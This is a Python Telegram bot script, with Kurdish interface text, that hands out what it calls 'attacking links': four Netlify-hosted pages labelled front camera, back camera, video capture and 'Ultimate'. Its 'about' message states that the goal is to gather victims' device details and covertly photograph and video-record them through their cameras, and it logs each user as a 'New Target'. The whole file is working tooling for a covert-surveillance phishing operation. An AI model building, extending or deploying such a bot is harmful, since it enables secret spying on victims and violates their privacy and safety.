import os
import sys
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# تووکن لە ژینگەی سێرڤەرەوە دەخوێنرێتەوە (بۆ پاراستنی تەواو لە گیتهەب)
BOT_TOKEN = os.environ.get("BOT_TOKEN")

if not BOT_TOKEN:
    print("[!] ERROR: BOT_TOKEN is not set in the environment variables!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# تابلۆی پێشوازیکردنی شاهانە
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user = message.from_user
    user_name = user.first_name
    username = f"@{user.username}" if user.username else "N/A"
    user_id = user.id
    
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 🚨 New Target Connected -> Name: {user_name} | ID: {user_id} | Username: {username}")
    
    welcome_text = (
        f"💀 **بەخێر بێیت بۆ ژووری ئۆپەراسیۆنە تیتانیۆمییەکان، {user_name}!** 💀\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **سیستەمی کۆکردنەوەی زانیاری و کامێراکان:**\n"
        "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
        "• ئاستی پارێزربی: `MILITARY-GRADE (NO TOKEN LEAK)`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 فەرموو یەکێک لە لینکە هێرشبەرەکان هەڵبژێرە:"
    )
    
    # دروستکردنی دوگمەکانی هەڵبژاردنی لینکەکان بە پێی داواکارییەکەت
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📸 کامێرای پێشەوە", url="https://genuine-bublanina-6ef92a.netlify.app/"),
        InlineKeyboardButton("📸 کامێرای پشتەوە", url="https://majestic-cannoli-a2db6b.netlify.app/"),
        InlineKeyboardButton("🎥 ٨ چرکە ڤیدیۆ گرتن", url="https://splendorous-toffee-5f8076.netlify.app"),
        InlineKeyboardButton("💎 هەمووی پێکەوە (Ultimate)", url="https://jolly-entremet-36bd78.netlify.app"),
        InlineKeyboardButton("🛡️ دەربارەی تیتانیۆم کۆر", callback_data="about")
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

# بەڕێوەبردنی کلیلی سیستەمەکان
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "about":
        bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
        about_msg = (
            "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\n"
            "ئەم بۆتە وەک ژووری ئۆپەراسیۆن و کۆنتڕۆڵی تۆ کار دەکات بۆ دروستکردن و دابەشکردنی لینکە هێرشبەرەکان. "
            "ئامانجی سەرەکی کۆکردنەوەی زانیارییە وردەکانی ئامێر و وێنەگرتن و ڤیدیۆتۆمارکردنی قوربانییە لە ڕێگەی کامێراکانەوە بە کوالێتی بەرز."
        )
        bot.send_message(call.message.chat.id, about_msg, parse_mode="Markdown")

if __name__ == '__main__':
    print("==========================================")
    print("💀 SECURE TITANIUM OMEGA BOT INITIALIZED 💀")
    print("==========================================")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"[!] Connection Error Handled: {e}")
            time.sleep(3)
